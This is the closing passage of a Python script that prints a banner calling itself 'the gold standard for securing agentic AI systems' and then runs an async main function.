    
    print("\n" + "=" * 70)
    print("This is the gold standard for securing agentic AI systems!")
    print("=" * 70)


if __name__ == "__main__":
    asyncio.run(main())
